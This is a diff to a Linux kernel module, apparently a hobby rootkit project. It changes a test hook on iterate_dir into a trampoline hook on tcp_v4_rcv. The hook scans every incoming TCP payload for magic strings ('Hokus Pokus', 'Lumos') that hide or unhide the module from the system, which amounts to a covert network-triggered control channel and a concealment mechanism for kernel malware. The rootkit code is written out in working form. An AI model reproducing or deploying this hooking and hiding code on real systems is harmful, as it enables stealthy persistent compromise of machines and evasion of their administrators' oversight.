@@ -1,45 +1,66 @@
 #include <linux/init.h>
 #include <linux/module.h>
-#include <linux/fs.h>
+#include <linux/tcp.h>
+#include <linux/string.h>
 #include "trampoline/trampoline.h"
+#include "invisibility/invisibility.h"
 
 
 MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("Amit Barzilai");
 MODULE_DESCRIPTION("Trampoline hook");
 
+#define INVISIBLE_COMMAND "Hokus Pokus"
+#define VISIBLE_COMMAND "Lumos"
 
-static int (*orig_iterate_dir)(struct file *, struct dir_context *);
-
-static int hooked_iterate_dir(struct file *f, struct dir_context *dc)
+static int invokes_command(const char *str, size_t str_len, char *command)
 {
-    printk(KERN_ALERT "Get hooked douchebag!\n");
-    return orig_iterate_dir(f, dc);
+    return str_len >= strlen(command) && !strncmp(str, command, strlen(command) - 1);
 }
 
-static const hook_t iterate_dir_hook = {
-    .target_name = "iterate_dir",
-    .original_function = (void *)&orig_iterate_dir,
-    .function = hooked_iterate_dir
+static int (*orig_tcp_v4_rcv)(struct sk_buff *);
+
+static int hooked_tcp_v4_rcv(struct sk_buff *skb)
+{
+    unsigned char *payload;
+    unsigned int payload_len;
+    void *tcp_header = tcp_hdr(skb);
+    
+    payload = (unsigned char *)tcp_header + tcp_hdrlen(skb);
+    payload_len = skb->len - tcp_hdrlen(skb);
+
+    if (invokes_command(payload, payload_len, INVISIBLE_COMMAND))
+        make_module_invisible(THIS_MODULE);
+
+    if (invokes_command(payload, payload_len, VISIBLE_COMMAND))
+        make_module_visible(THIS_MODULE);
+
+    return orig_tcp_v4_rcv(skb);
+}
+
+static const hook_t tcp_v4_rcv_hook = {
+    .target_name = "tcp_v4_rcv",
+    .original_function = (void *)&orig_tcp_v4_rcv,
+    .function = hooked_tcp_v4_rcv
 };
 
-static int hook_ls_init(void)
+static int captain_init(void)
 {
     int err;
-    err = tramp_hook_install(&iterate_dir_hook);
+    err = tramp_hook_install(&tcp_v4_rcv_hook);
     if (err) {
         printk(KERN_ALERT "Failed installing hook\n");
         return err;
     }
-    printk(KERN_INFO "Installed iterate_dir hook\n");
+    printk(KERN_INFO "Installed captain hook\n");
 	return 0;
 }
 
-static void hook_ls_exit(void)
+static void captain_exit(void)
 {
-    tramp_hook_uninstall(&iterate_dir_hook);
-	printk(KERN_INFO "Removed iterate_dir hook\n");
+    tramp_hook_uninstall(&tcp_v4_rcv_hook);
+	printk(KERN_INFO "Removed captain hook\n");
 }
 
-module_init(hook_ls_init);
-module_exit(hook_ls_exit);
+module_init(captain_init);
+module_exit(captain_exit);
